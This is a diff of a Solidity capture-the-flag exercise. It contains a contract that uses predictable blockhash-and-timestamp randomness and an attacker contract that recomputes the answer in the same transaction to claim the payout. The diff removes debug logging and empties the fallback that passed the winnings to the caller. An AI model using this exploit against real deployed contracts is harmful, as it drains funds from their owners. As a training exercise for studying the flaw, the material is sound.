@@ -1,6 +1,5 @@
 pragma solidity ^0.4.21;
 
-import "hardhat/console.sol";
 /*
 The number is now generated on-demand when a guess is made.
 */
@@ -14,18 +13,19 @@ contract GuessTheNewNumberChallenge {
         return address(this).balance == 0;
     }
 
-    function guess(uint8 n) public payable {
+    function guess(uint8 n) public payable { 
         require(msg.value == 1 ether);
-
+ 
         uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
-
-        if (n == answer) {
-            console.log("2if", address(this).balance);
+ 
+        if (n == answer) { 
             msg.sender.transfer(2 ether);
-        }console.log("2");
+        }
     }
 }
-
+/*
+Solution: Compute number in the same transaction.
+*/
 contract GuessTheNewNumberChallengeAttacker {
     address victim;
     address caller;
@@ -34,14 +34,11 @@ contract GuessTheNewNumberChallengeAttacker {
         victim = _victim;
     }
 
-    function getAnswer() payable external {
+    function attack() payable external {
         caller = msg.sender;
         GuessTheNewNumberChallenge(victim).guess.value(msg.value)(uint8(keccak256(block.blockhash(block.number - 1), now)));
-        console.log("2");
     }
 
     function() payable public {
-        console.log("got it");
-        payable(caller).transfer(2 ether);
     }
 }
